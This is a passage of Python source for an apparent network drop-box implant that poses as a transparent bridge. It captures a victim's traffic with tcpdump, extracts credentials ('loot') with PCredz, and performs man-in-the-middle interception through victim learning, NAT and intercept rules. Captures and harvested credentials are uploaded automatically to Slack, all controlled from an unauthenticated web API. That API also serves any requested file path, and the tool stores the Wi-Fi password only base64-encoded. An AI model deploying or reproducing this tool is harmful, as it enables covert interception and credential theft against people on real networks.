            log("=== Transparent Bridge Ready ===", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Bridge setup failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def start_capture(self):
        """Start packet capture on bridge"""
        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            log("Capture already running", 'WARNING')
            return True

        try:
            log("=== Starting Packet Capture ===")

            # Ensure bridge is set up
            if not self.bridge_initialized:
                log("Bridge not initialized, setting up...")
                if not self.setup_transparent_bridge():
                    return False

            # Final verification
            result = run_cmd(['ip', 'link', 'show', CONFIG['BRIDGE_NAME']])
            if not result or 'state UP' not in result.stdout:
                log("ERROR: Bridge is not UP!", 'ERROR')
                return False

            # Create capture directory
            os.makedirs(CONFIG['PCAP_DIR'], exist_ok=True)

            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%dT%H%M%SZ')
            self.pcap_file = os.path.join(CONFIG['PCAP_DIR'], f'capture-{timestamp}.pcap')

            log(f"Starting tcpdump on {CONFIG['BRIDGE_NAME']}...")
            log(f"Output: {self.pcap_file}")

            # Start tcpdump
            self.tcpdump_process = subprocess.Popen(
                ['tcpdump', '-i', CONFIG['BRIDGE_NAME'], '-s', '0', '-U',
                 '-w', self.pcap_file, 'not arp and not stp'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                preexec_fn=os.setpgrp
            )

            time.sleep(2)

            # Verify
            if self.tcpdump_process.poll() is not None:
                stderr = self.tcpdump_process.stderr.read().decode()
                log(f"tcpdump failed: {stderr}", 'ERROR')
                return False

            with open(CONFIG['PIDFILE'], 'w') as f:
                f.write(str(self.tcpdump_process.pid))

            self.start_time = datetime.now().isoformat()
            self.stop_monitoring = False

            log(f"✓ tcpdump started (PID: {self.tcpdump_process.pid})", 'SUCCESS')

            # Start monitoring
            self.monitor_thread = threading.Thread(target=self._monitor_loop, daemon=True)
            self.monitor_thread.start()

            self._save_state()
            log("=== Capture Started ===", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Capture start failed: {e}", 'ERROR')
            import traceback
            log(traceback.format_exc(), 'ERROR')
            return False

    def _monitor_loop(self):
        """Monitor PCAP size and analyze"""
        last_analysis = time.time()

        while not self.stop_monitoring:
            try:
                if not self.tcpdump_process or self.tcpdump_process.poll() is not None:
                    break

                if self.pcap_file and os.path.exists(self.pcap_file):
                    if self.analysis_interval and time.time() - last_analysis >= self.analysis_interval:
                        log("Running periodic analysis...")
                        threading.Thread(
                            target=self.loot_analyzer.analyze_pcap,
                            args=(self.pcap_file,),
                            daemon=True
                        ).start()
                        last_analysis = time.time()

                time.sleep(5)

            except Exception as e:
                log(f"Monitor loop error: {e}", 'ERROR')
                time.sleep(5)

    def delete_pcap(self):
        """Delete the current capture (requires capture to be stopped)"""
        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            log("Cannot delete PCAP while capture is running", 'WARNING')
            return False, 'Capture is still running'

        if not self.pcap_file:
            log("No PCAP file to delete", 'WARNING')
            return False, 'No PCAP file to delete'

        try:
            if os.path.exists(self.pcap_file):
                os.remove(self.pcap_file)
                log(f"Deleted PCAP file {self.pcap_file}")
            else:
                log("PCAP path does not exist on disk", 'WARNING')
                return False, 'PCAP file not found'
        except Exception as e:
            log(f"Failed to delete PCAP: {e}", 'ERROR')
            return False, str(e)

        self.pcap_file = None
        self._save_state()
        return True, None

    def stop_capture(self):
        """Stop capture (keep bridge running)"""
        log("Stopping capture...")
        self.stop_monitoring = True

        if self.monitor_thread and self.monitor_thread.is_alive():
            self.monitor_thread.join(timeout=5)

        try:
            if self.tcpdump_process:
                self.tcpdump_process.terminate()
                try:
                    self.tcpdump_process.wait(timeout=5)
                except Exception:
                    self.tcpdump_process.kill()
                self.tcpdump_process = None

            if self.pcap_file and os.path.exists(self.pcap_file):
                log("Running final analysis...")
                self.loot_analyzer.analyze_pcap(self.pcap_file)

            if os.path.exists(CONFIG['PIDFILE']):
                os.remove(CONFIG['PIDFILE'])

            self.start_time = None
            log("Capture stopped (bridge remains active)", 'SUCCESS')
            return True

        except Exception as e:
            log(f"Stop failed: {e}", 'ERROR')
            return False

    def _isolate_networkmanager(self, interfaces):
        """Isolate specified interfaces from NetworkManager (deprecated - no longer needed)"""
        # This method is kept for backward compatibility but does nothing
        # WiFi connections now use wpa_supplicant + systemd-networkd
        # Bridge interfaces are managed directly via ip commands
        log("NetworkManager isolation skipped (using wpa_supplicant + systemd-networkd)", 'INFO')
        return True

    def _force_cleanup_bridge(self):
        """Force cleanup bridge"""
        bridge = CONFIG['BRIDGE_NAME']
        run_cmd(['ip', 'link', 'set', bridge, 'down'])
        run_cmd(['ip', 'link', 'delete', bridge])

        for iface in self.interfaces:
            run_cmd(['ip', 'link', 'set', iface, 'nomaster'])

    def get_status(self):
        """Get current status"""
        status = {
            'status': 'inactive',
            'bridge': None,
            'bridge_active': self.bridge_initialized,
            'interfaces': [],
            'pcap_file': None,
            'pcap_size': 0,
            'packet_count': 0,
            'pid': None,
            'start_time': None,
            'client_ip': self.client_ip,
            'gateway_ip': self.gateway_ip,
            'logs': self._get_logs(),
            'mitm': self.mitm_manager.get_status(),
            'wifi': self.wifi_manager.get_connection_status(),
            'slack': self.slack_manager.get_upload_status()
        }

        if self.tcpdump_process and self.tcpdump_process.poll() is None:
            status['status'] = 'active'
            status['pid'] = self.tcpdump_process.pid
            status['pcap_file'] = self.pcap_file
            status['start_time'] = self.start_time
            status['bridge'] = CONFIG['BRIDGE_NAME']

            # Update IPs
            self._detect_network_ips()
            status['client_ip'] = self.client_ip
            status['gateway_ip'] = self.gateway_ip

            if self.pcap_file and os.path.exists(self.pcap_file):
                status['pcap_size'] = os.path.getsize(self.pcap_file)
                # Use capinfos if available for faster packet counting, otherwise skip
                result = run_cmd(['capinfos', '-c', self.pcap_file], timeout=2)
                if result and result.returncode == 0 and result.stdout:
                    # capinfos outputs: Number of packets: 1234
                    match = re.search(r'Number of packets:\s*(\d+)', result.stdout)
                    if match:
                        status['packet_count'] = int(match.group(1))
                    else:
                        status['packet_count'] = 0
                else:
                    # Skip counting if capinfos not available (too slow with tcpdump)
                    status['packet_count'] = 0
        else:
            if self.pcap_file and os.path.exists(self.pcap_file):
                status['pcap_file'] = self.pcap_file
                status['pcap_size'] = os.path.getsize(self.pcap_file)

        status['interfaces'] = self._get_interfaces()
        return status

    def _detect_network_ips(self):
        """Best-effort detection of client and gateway IPs."""
        try:
            gateway_ip = None
            route = run_cmd(['ip', '-4', 'route', 'show', 'default'])
            if route and route.returncode == 0:
                match = re.search(r'default via (\S+)', route.stdout)
                if match:
                    gateway_ip = match.group(1)

            client_ip = None
            if self.interfaces:
                neigh = run_cmd(['ip', '-4', 'neigh', 'show'])
                if neigh and neigh.returncode == 0:
                    for line in neigh.stdout.splitlines():
                        parts = line.split()
                        if not parts or 'FAILED' in parts or 'dev' not in parts:
                            continue
                        dev = parts[parts.index('dev') + 1]
                        if dev == self.interfaces[0]:
                            client_ip = parts[0]
                            break

            if client_ip:
                self.client_ip = client_ip
            if gateway_ip:
                self.gateway_ip = gateway_ip
        except Exception as e:
            log(f"Failed to detect network IPs: {e}", 'WARNING')

    def _save_state(self):
        """Save state"""
        try:
            with open(CONFIG['STATEFILE'], 'w') as f:
                if self.interfaces:
                    f.write(f'CLIENT_INT="{self.interfaces[0]}"\n')
                    f.write(f'SWITCH_INT="{self.interfaces[1]}"\n')
                f.write(f'BRIDGE_NAME="{CONFIG["BRIDGE_NAME"]}"\n')
                if self.pcap_file:
                    f.write(f'PCAP_FILE="{self.pcap_file}"\n')
                if self.start_time:
                    f.write(f'START_TIME="{self.start_time}"\n')
        except Exception:
            pass

    def save_config(self):
        """Save WiFi and Slack configuration to file"""
        try:
            import base64
            config_data = {
                'wifi': {
                    'interface': self.wifi_manager.interface,
                    'ssid': self.wifi_manager.ssid,
                    'password': base64.b64encode(self.wifi_manager.password.encode()).decode() if self.wifi_manager.password else None,
                    'auto_connect': self.auto_connect_wifi
                },
                'slack': {
                    'webhook_url': self.slack_manager.webhook_url,
                    'bot_token': self.slack_manager.bot_token,
                    'channel': self.slack_manager.channel,
                    'auto_upload': self.auto_enable_upload,
                    'upload_pcap': self.slack_manager.upload_pcap,
                    'upload_pcredz': self.slack_manager.upload_pcredz
                },
                'last_saved': datetime.now().isoformat()
            }
            
            os.makedirs(os.path.dirname(CONFIG['CONFIG_FILE']), exist_ok=True)
            with open(CONFIG['CONFIG_FILE'], 'w') as f:
                json.dump(config_data, f, indent=2)
            os.chmod(CONFIG['CONFIG_FILE'], 0o600)
            log("Configuration saved")
            return True
        except Exception as e:
            log(f"Failed to save config: {e}", 'ERROR')
            return False

    def load_saved_config(self):
        """Load saved configuration from file"""
        try:
            import base64
            if not os.path.exists(CONFIG['CONFIG_FILE']):
                return False
            
            with open(CONFIG['CONFIG_FILE'], 'r') as f:
                config_data = json.load(f)
            
            # Load WiFi config
            if 'wifi' in config_data:
                wifi_cfg = config_data['wifi']
                self.wifi_manager.interface = wifi_cfg.get('interface')
                self.wifi_manager.ssid = wifi_cfg.get('ssid')
                if wifi_cfg.get('password'):
                    self.wifi_manager.password = base64.b64decode(wifi_cfg['password']).decode()
                self.auto_connect_wifi = wifi_cfg.get('auto_connect', False)
                CONFIG['WIFI_INTERFACE'] = wifi_cfg.get('interface')
                CONFIG['WIFI_SSID'] = wifi_cfg.get('ssid')
                CONFIG['WIFI_PASSWORD'] = self.wifi_manager.password
            
            # Load Slack config
            if 'slack' in config_data:
                slack_cfg = config_data['slack']
                self.slack_manager.webhook_url = slack_cfg.get('webhook_url')
                self.slack_manager.bot_token = slack_cfg.get('bot_token')
                self.slack_manager.channel = slack_cfg.get('channel')
                self.auto_enable_upload = slack_cfg.get('auto_upload', False)
                self.slack_manager.upload_pcap = slack_cfg.get('upload_pcap', True)
                self.slack_manager.upload_pcredz = slack_cfg.get('upload_pcredz', True)
                CONFIG['SLACK_WEBHOOK_URL'] = slack_cfg.get('webhook_url')
                CONFIG['SLACK_BOT_TOKEN'] = slack_cfg.get('bot_token')
                CONFIG['SLACK_CHANNEL'] = slack_cfg.get('channel')
                CONFIG['UPLOAD_PCAP'] = self.slack_manager.upload_pcap
                CONFIG['UPLOAD_PCREDZ'] = self.slack_manager.upload_pcredz
            
            # Apply auto-connect/auto-upload if enabled
            if self.auto_connect_wifi and self.wifi_manager.interface and self.wifi_manager.ssid:
                log("Auto-connecting to WiFi...")
                self.wifi_manager.connect_to_ap(self.wifi_manager.interface, self.wifi_manager.ssid, self.wifi_manager.password)
            
            if self.auto_enable_upload and self.slack_manager.webhook_url and self.slack_manager.bot_token and self.slack_manager.channel:
                log("Auto-enabling Slack upload...")
                self.slack_manager.start_auto_upload()
            
            log("Configuration loaded")
            return True
        except Exception as e:
            log(f"Failed to load config: {e}", 'ERROR')
            return False

    def apply_saved_config(self):
        """Apply saved configuration (connect WiFi, enable upload)"""
        result = {'wifi_connected': False, 'upload_enabled': False}
        
        if self.auto_connect_wifi and self.wifi_manager.interface and self.wifi_manager.ssid:
            conn_result = self.wifi_manager.connect_to_ap(self.wifi_manager.interface, self.wifi_manager.ssid, self.wifi_manager.password)
            result['wifi_connected'] = conn_result.get('success', False)
        
        if self.auto_enable_upload and self.slack_manager.webhook_url and self.slack_manager.bot_token and self.slack_manager.channel:
            self.slack_manager.start_auto_upload()
            result['upload_enabled'] = True
        
        return result

    def _get_interfaces(self):
        """Get all network interfaces with roles"""
        interfaces = []
        result = run_cmd(['ip', '-j', 'link', 'show'])
        if not result:
            return interfaces

        try:
            import json
            data = json.loads(result.stdout)
            for item in data:
                ifname = item.get('ifname', '')
                if not ifname or ifname == 'lo' or ifname.startswith(('docker', 'veth', 'virbr')):
                    continue

                state = item.get('operstate', 'UNKNOWN').upper()
                addr_info = item.get('addr_info', [])
                mac = item.get('address', 'N/A')

                # Get IP address if available
                ip_addr = None
                if addr_info:
                    for addr in addr_info:
                        if addr.get('family') == 'inet':
                            ip_addr = addr.get('local', 'N/A')
                            break

                # Determine interface role
                role = get_interface_role(ifname)
                role_label = {
                    'bridge': 'Bridge',
                    'ap': 'AP (Management)',
                    'client': 'Client (Internet)',
                    'eth': 'Bridge Member',
                    'unknown': 'Unknown'
                }.get(role, 'Unknown')

                interfaces.append({
                    'name': ifname,
                    'state': state,
                    'mac': mac,
                    'ip': ip_addr or 'N/A',
                    'role': role,
                    'role_label': role_label
                })
        except Exception as e:
            log(f"Error parsing interfaces: {e}", 'WARNING')
            # Fallback to simple parsing
            result = run_cmd(['ip', 'link', 'show'])
            if result:
                for line in result.stdout.split('\n'):
                    if ':' in line and 'state' in line.lower():
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ifname = parts[1].strip().split('@')[0]
                            if ifname and ifname != 'lo' and not ifname.startswith(('docker', 'veth', 'virbr')):
                                state = 'UP' if 'state UP' in line else 'DOWN'
                                role = get_interface_role(ifname)
                                role_label = {
                                    'bridge': 'Bridge',
                                    'ap': 'AP (Management)',
                                    'client': 'Client (Internet)',
                                    'eth': 'Bridge Member',
                                    'unknown': 'Unknown'
                                }.get(role, 'Unknown')
                                interfaces.append({
                                    'name': ifname,
                                    'state': state,
                                    'mac': 'N/A',
                                    'ip': 'N/A',
                                    'role': role,
                                    'role_label': role_label
                                })

        return interfaces

    def _get_logs(self, lines=10):
        """Get recent logs - optimized to read only last N lines"""
        try:
            if os.path.exists(CONFIG['LOGFILE']):
                # Use efficient tail reading for large log files
                result = run_cmd(['tail', '-n', str(lines), CONFIG['LOGFILE']], timeout=1)
                if result and result.stdout:
                    return [line.strip() for line in result.stdout.strip().split('\n') if line.strip()]
                # Fallback if tail fails
                with open(CONFIG['LOGFILE'], 'r') as f:
                    return [line.strip() for line in f.readlines()[-lines:] if line.strip()]
        except Exception:
            pass
        return []

# ============================================================================
# WEB SERVER
# ============================================================================

class NACWebHandler(BaseHTTPRequestHandler):
    bridge_manager = None

    def log_message(self, format, *args):
        pass

    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _send_html(self):
        """Serve HTML from external file or fallback to embedded"""
        try:
            script_dir = os.path.dirname(os.path.abspath(__file__))
            html_path = os.path.join(script_dir, 'app', 'static', 'index.html')
            
            if os.path.exists(html_path):
                with open(html_path, 'r', encoding='utf-8') as f:
                    html_content = f.read()
            else:
                # Fallback to embedded template
                html_content = get_html_template()
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
        except Exception as e:
            log(f"Error serving HTML: {e}", 'ERROR')
            self.send_error(500, str(e))

    def do_GET(self):
        path = urlparse(self.path).path

        if path in ['/', '/index.html']:
            self._send_html()
        elif path == '/api/status':
            self._send_json(self.bridge_manager.get_status())
        elif path == '/api/loot':
            self._send_json(self.bridge_manager.loot_analyzer.get_loot_summary())
        elif path == '/api/loot/export':
            raw_output = self.bridge_manager.loot_analyzer.raw_output
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Content-Disposition',
                             'attachment; filename="pcredz_output.txt"')
            self.end_headers()
            self.wfile.write(raw_output.encode('utf-8'))
        elif path == '/api/download':
            query = parse_qs(urlparse(self.path).query)
            pcap_file = query.get('file', [None])[0]
            if pcap_file and os.path.exists(pcap_file):
                try:
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/vnd.tcpdump.pcap')
                    self.send_header('Content-Disposition',
                                     f'attachment; filename="{os.path.basename(pcap_file)}"')
                    self.end_headers()
                    with open(pcap_file, 'rb') as f:
                        self.wfile.write(f.read())
                except Exception:
                    self.send_error(500)
            else:
                self.send_error(404)
        
        # Test page for debugging
        elif path == '/test':
            try:
                # Get script directory dynamically
                script_dir = os.path.dirname(os.path.abspath(__file__))
                test_file_path = os.path.join(script_dir, 'test-webui.html')
                
                if os.path.exists(test_file_path):
                    with open(test_file_path, 'r', encoding='utf-8') as f:
                        test_html = f.read()
                    log(f"Serving test page from: {test_file_path}")
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(test_html.encode('utf-8'))
                else:
                    log(f"Test page not found at: {test_file_path}", 'ERROR')
                    self.send_error(404, f"Test page not found at: {test_file_path}")
            except Exception as e:
                log(f"Test page error: {e}", 'ERROR')
                self.send_error(404, f"Test page error: {e}")
        
        # WiFi endpoints
        elif path == '/api/wifi/interfaces':
            interfaces = self.bridge_manager.wifi_manager.get_wifi_interfaces()
            self._send_json({'interfaces': interfaces})
        elif path == '/api/wifi/scan/results':
            self._send_json({'aps': self.bridge_manager.wifi_manager.scan_results})
        elif path == '/api/wifi/status':
            self._send_json(self.bridge_manager.wifi_manager.get_connection_status())
        elif path == '/api/upload/status':
            self._send_json(self.bridge_manager.slack_manager.get_upload_status())
        elif path == '/api/config/load':
            config_data = {
                'wifi': {
                    'interface': self.bridge_manager.wifi_manager.interface,
                    'ssid': self.bridge_manager.wifi_manager.ssid,
                    'auto_connect': self.bridge_manager.auto_connect_wifi
                },
                'slack': {
                    'webhook_url': self.bridge_manager.slack_manager.webhook_url,
                    'bot_token': self.bridge_manager.slack_manager.bot_token,
                    'channel': self.bridge_manager.slack_manager.channel,
                    'auto_upload': self.bridge_manager.auto_enable_upload,
                    'upload_pcap': self.bridge_manager.slack_manager.upload_pcap,
                    'upload_pcredz': self.bridge_manager.slack_manager.upload_pcredz
                }
            }
            self._send_json(config_data)
        
        else:
            self.send_error(404)

    def do_POST(self):
        path = urlparse(self.path).path

        if path == '/api/start':
            with capture_lock:
                success = self.bridge_manager.start_capture()
            self._send_json({'success': success})
            
        elif path == '/api/stop':
            with capture_lock:
                success = self.bridge_manager.stop_capture()
            self._send_json({'success': success})
            
        elif path == '/api/analyze':
            # Manual PCredz analysis
            pcap_file = self.bridge_manager.pcap_file
            if pcap_file and os.path.exists(pcap_file):
                result = self.bridge_manager.loot_analyzer.analyze_pcap(pcap_file)
                self._send_json(result)
            else:
                self._send_json({'success': False, 'error': 'No PCAP file available'})
                
        elif path == '/api/delete_pcap':
            with capture_lock:
                success, error = self.bridge_manager.delete_pcap()
            response = {'success': success}
            if error:
                response['error'] = error
            self._send_json(response)
            
        elif path == '/api/loot/clear':
            self.bridge_manager.loot_analyzer.clear_loot()
            self._send_json({'success': True})
            
        # MITM endpoints
        elif path == '/api/mitm/enable':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                
                mitm = self.bridge_manager.mitm_manager
                bridge = CONFIG['BRIDGE_NAME']
                
                # Setup bridge IP
                if not mitm.setup_bridge_ip(bridge):
                    self._send_json({'success': False, 'error': 'Failed to assign bridge IP'})
                    return
                
                # Learn victim
                if not mitm.learn_victim(bridge, timeout=30):
                    self._send_json({'success': False, 'error': 'Failed to learn victim identity'})
                    return
                
                # Setup NAT
                switch_iface = self.bridge_manager.interfaces[1]
                if not mitm.setup_nat_rules(bridge, switch_iface):
                    self._send_json({'success': False, 'error': 'Failed to setup NAT'})
                    return
                
                # Setup remote routing if requested
                remote_ip = data.get('remote_ip')
                if remote_ip:
                    mitm.setup_remote_routing(remote_ip)
                
                mitm.enabled = True
                CONFIG['MITM_ENABLED'] = True
                self._send_json({'success': True})
                
            except Exception as e:
                log(f"MITM enable failed: {e}", 'ERROR')
                self._send_json({'success': False, 'error': str(e)})
                
        elif path == '/api/mitm/disable':
            self.bridge_manager.mitm_manager.cleanup()
            self._send_json({'success': True})
            
        elif path == '/api/mitm/intercept':
            try:
                content_length = int(self.headers['Content-Length'])
                body = self.rfile.read(content_length)
                data = json.loads(body)
                
                category = data.get('category')
                destination = data.get('destination', 'local')
                
                if category not in INTERCEPT_PROTOCOLS:
                    self._send_json({'success': False, 'error': 'Invalid category'})
                    return
                
                mitm = self.bridge_manager.mitm_manager
                success_count = 0
                
                for proto_name, port, protos in INTERCEPT_PROTOCOLS[category]:
                    if mitm.add_intercept_rule(proto_name, port, protos, destination):
                        success_count += 1
                
                self._send_json({
                    'success': success_count > 0,
                    'rules_added': success_count
                })
                
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
                
        elif path == '/api/mitm/clear_rules':
            self.bridge_manager.mitm_manager.remove_all_intercept_rules()
            self._send_json({'success': True})
            
        # WiFi endpoints
        elif path == '/api/wifi/scan':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                interface = data.get('interface')
                if interface:
                    aps = self.bridge_manager.wifi_manager.scan_aps(interface)
                    self._send_json({'success': True, 'aps': aps})
                else:
                    self._send_json({'success': False, 'error': 'Interface required'})
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/wifi/connect':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                result = self.bridge_manager.wifi_manager.connect_to_ap(
                    data.get('interface'),
                    data.get('ssid'),
                    data.get('password')
                )
                self._send_json(result)
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/wifi/disconnect':
            result = self.bridge_manager.wifi_manager.disconnect_wifi()
            self._send_json({'success': result})
        
        elif path == '/api/wifi/test':
            result = self.bridge_manager.wifi_manager.test_internet_connectivity()
            self._send_json(result)
        
        # Slack endpoints
        elif path == '/api/slack/test/webhook':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                result = self.bridge_manager.slack_manager.test_webhook_connection(data.get('webhook_url'))
                self._send_json(result)
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/slack/test/token':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                result = self.bridge_manager.slack_manager.test_bot_token(data.get('bot_token'))
                self._send_json(result)
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/slack/test/integration':
            try:
                log("Testing full Slack integration...", 'INFO')
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                
                log("Step 1: Testing webhook...", 'INFO')
                webhook_result = self.bridge_manager.slack_manager.test_webhook_connection(data.get('webhook_url'))
                log(f"Webhook test result: {'PASS' if webhook_result.get('success') else 'FAIL'}", 'SUCCESS' if webhook_result.get('success') else 'ERROR')
                
                log("Step 2: Testing bot token...", 'INFO')
                token_result = self.bridge_manager.slack_manager.test_bot_token(data.get('bot_token'))
                log(f"Token test result: {'PASS' if token_result.get('success') else 'FAIL'}", 'SUCCESS' if token_result.get('success') else 'ERROR')
                
                integration_success = webhook_result.get('success') and token_result.get('success')
                log(f"Integration test: {'PASS' if integration_success else 'FAIL'}", 'SUCCESS' if integration_success else 'ERROR')
                
                self._send_json({
                    'success': integration_success,
                    'webhook': webhook_result.get('success'),
                    'webhook_details': webhook_result,
                    'token': token_result.get('success'),
                    'token_details': token_result
                })
            except Exception as e:
                log(f"Integration test error: {str(e)}", 'ERROR')
                import traceback
                log(traceback.format_exc(), 'ERROR')
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/slack/configure':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                self.bridge_manager.slack_manager.webhook_url = data.get('webhook_url')
                self.bridge_manager.slack_manager.bot_token = data.get('bot_token')
                self.bridge_manager.slack_manager.channel = data.get('channel')
                self._send_json({'success': True})
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/upload/enable':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                enabled = data.get('enabled', True)
                upload_pcap = data.get('upload_pcap')
                upload_pcredz = data.get('upload_pcredz')
                if upload_pcap is not None:
                    self.bridge_manager.slack_manager.upload_pcap = upload_pcap
                if upload_pcredz is not None:
                    self.bridge_manager.slack_manager.upload_pcredz = upload_pcredz
                if enabled:
                    self.bridge_manager.slack_manager.start_auto_upload()
                else:
                    self.bridge_manager.slack_manager.stop_auto_upload()
                self._send_json({'success': True})
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/upload/trigger':
            log("Manual upload triggered via API", 'INFO')
            try:
                self.bridge_manager.slack_manager.upload_capture_data()
                log("Manual upload completed successfully", 'SUCCESS')
                self._send_json({'success': True, 'message': 'Upload triggered'})
            except Exception as e:
                log(f"Manual upload failed: {str(e)}", 'ERROR')
                self._send_json({'success': False, 'error': str(e)})
        
        # Config endpoints
        elif path == '/api/config/save':
            try:
                content_length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else '{}'
                data = json.loads(body) if body else {}
                
                # Update WiFi settings
                if 'wifi' in data:
                    wifi_cfg = data['wifi']
                    self.bridge_manager.wifi_manager.interface = wifi_cfg.get('interface')
                    self.bridge_manager.wifi_manager.ssid = wifi_cfg.get('ssid')
                    self.bridge_manager.wifi_manager.password = wifi_cfg.get('password')
                    self.bridge_manager.auto_connect_wifi = wifi_cfg.get('auto_connect', False)
                
                # Update Slack settings
                if 'slack' in data:
                    slack_cfg = data['slack']
                    self.bridge_manager.slack_manager.webhook_url = slack_cfg.get('webhook_url')
                    self.bridge_manager.slack_manager.bot_token = slack_cfg.get('bot_token')
                    self.bridge_manager.slack_manager.channel = slack_cfg.get('channel')
                    self.bridge_manager.auto_enable_upload = slack_cfg.get('auto_upload', False)
                    self.bridge_manager.slack_manager.upload_pcap = slack_cfg.get('upload_pcap', True)
                    self.bridge_manager.slack_manager.upload_pcredz = slack_cfg.get('upload_pcredz', True)
                
                result = self.bridge_manager.save_config()
                self._send_json({'success': result})
            except Exception as e:
                self._send_json({'success': False, 'error': str(e)})
        
        elif path == '/api/config/apply':
            result = self.bridge_manager.apply_saved_config()
            self._send_json({'success': True, **result})
        
        else:
            self.send_error(404)

# ============================================================================
# HTML TEMPLATE (LEGACY - Use app/static/index.html instead)
# ============================================================================
# Note: This embedded template is kept as fallback only.
# The live HTML is now served from app/static/index.html for easier maintenance.

def get_html_template():
    """Return complete HTML template"""
    return '''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NAC Bridge Monitor - Transparent Tap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333}
.container{max-width:1400px;margin:0 auto}
.header{text-align:center;color:#fff;margin-bottom:30px}
.header h1{font-size:2.5em;margin-bottom:5px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
.header p{font-size:1em;opacity:.9}
.dashboard{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
.info-banner{background:#e3f2fd;border-left:4px solid #2196f3;padding:15px;margin-bottom:20px;border-radius:5px}
.info-banner h3{color:#1976d2;margin-bottom:5px}
.info-banner p{color:#555;font-size:.9em}
.tab-nav{display:flex;gap:10px;margin-bottom:25px;border-bottom:2px solid #e0e0e0}
.tab-btn{padding:12px 24px;border:none;background:transparent;cursor:pointer;font-weight:600;color:#666;border-bottom:3px solid transparent;transition:all .3s}
.tab-btn:hover{color:#667eea}
.tab-btn.active{color:#667eea;border-bottom-color:#667eea}
.badge{display:inline-block;background:#dc3545;color:#fff;border-radius:12px;padding:2px 8px;font-size:.75em;margin-left:5px;min-width:20px;text-align:center}
.tab-content{display:none}
.tab-content.active{display:block}
.status-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:15px;border-bottom:2px solid #f0f0f0}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border-radius:20px;font-weight:600;font-size:.9em}
.status-badge.active{background:#d4edda;color:#155724}
.status-badge.inactive{background:#f8d7da;color:#721c24}
.status-indicator{width:12px;height:12px;border-radius:50%}
.status-indicator.active{background:#28a745;animation:pulse 2s infinite}
.status-indicator.inactive{background:#dc3545}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin-bottom:30px}
.card{background:#f8f9fa;border-radius:10px;padding:20px;border-left:4px solid #667eea}
.card-title{font-size:.9em;color:#666;margin-bottom:10px;text-transform:uppercase}
.card-value{font-size:1.8em;font-weight:700;color:#333}
.card-detail{font-size:.85em;color:#888;margin-top:5px}
.interface-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;margin-top:15px}
.interface-card{background:#fff;border:2px solid #e0e0e0;border-radius:8px;padding:15px;transition:all .3s}
.interface-card:hover{border-color:#667eea;box-shadow:0 4px 12px rgba(102,126,234,0.2)}
.interface-header{display:flex;justify-content:space-between;margin-bottom:12px}
.interface-name{font-weight:700;font-size:1.1em;color:#667eea}
.interface-status{padding:4px 10px;border-radius:12px;font-size:.75em;font-weight:600}
.interface-status.up{background:#d4edda;color:#155724}
.interface-status.down{background:#f8d7da;color:#721c24}
